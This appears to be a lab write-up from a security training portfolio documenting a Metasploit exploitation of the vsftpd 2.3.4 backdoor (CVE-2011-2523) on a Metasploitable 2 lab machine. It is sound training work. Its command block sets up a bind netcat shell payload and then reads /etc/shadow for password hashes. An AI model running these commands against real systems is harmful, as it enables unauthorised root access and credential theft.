# (Metasploit)

## Overview
Using Metasploit Framework to exploit CVE-2011-2523, 
a backdoor vulnerability in vsftpd 2.3.4 running on 
Metasploitable 2. Includes full post-exploitation 
evidence collection demonstrating root-level access.

## Tools Used
- Metasploit Framework v6.4.116
- msfconsole
- nmap (reconnaissance)

## Target
- Metasploitable 2 — 192.168.56.105
- Service: vsftpd 2.3.4 (port 21)
- CVE: CVE-2011-2523

## Skills Demonstrated
- Metasploit Framework navigation
- Exploit selection and configuration
- Payload selection and deployment
- Root shell acquisition
- Post-exploitation evidence collection
- PostgreSQL database troubleshooting
- Kill chain documentation

## Key Commands
```bash
# Launch Metasploit
sudo msfconsole

# Inside msfconsole
db_import /home/kali/scan_results.xml
search vsftpd
use 1
set RHOSTS 192.168.56.105
set LHOST 192.168.56.1
set payload cmd/unix/bind_netcat
exploit

# Post-exploitation
id
whoami
uname -a
cat /etc/shadow
```

## Key Findings
- Successfully exploited vsftpd 2.3.4 backdoor
- Obtained root shell — uid=0(root) gid=0(root)
- Read /etc/shadow confirming full system compromise
- Documented complete exploitation kill chain

## Exploitation Kill Chain
| Phase | Action |
|-------|--------|
| Recon | Nmap identified vsftpd 2.3.4 on port 21 |
| Scanning | Confirmed CVE-2011-2523 vulnerability |
| Exploitation | Triggered backdoor via Metasploit |
| Access | Root shell obtained |
| Post-Exploit | Collected system info and password hashes |
| Reporting | Documented with screenshots and evidence |

## Lab Report
Full lab report with screenshots available in 
Lab05_Exploitation.docx
